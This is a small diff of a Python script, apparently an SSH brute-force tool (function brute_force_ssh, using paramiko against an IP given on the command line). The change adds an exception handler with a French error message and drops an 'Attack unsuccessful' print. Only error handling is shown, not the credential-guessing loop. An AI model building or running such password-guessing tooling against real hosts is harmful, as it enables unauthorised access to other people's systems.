@@ -18,9 +18,10 @@ def brute_force_ssh(ip):
                 return
             except paramiko.AuthenticationException:
                 continue
-    
-    print("Attack unsuccessful")
-
+            except Exception as e:
+                print(f"Impossible de se connecter en SSH à la machine {ip}: {e}")
+                return
+            
 # Get the IP address from command-line argument
 ip_address = sys.argv[1]
 
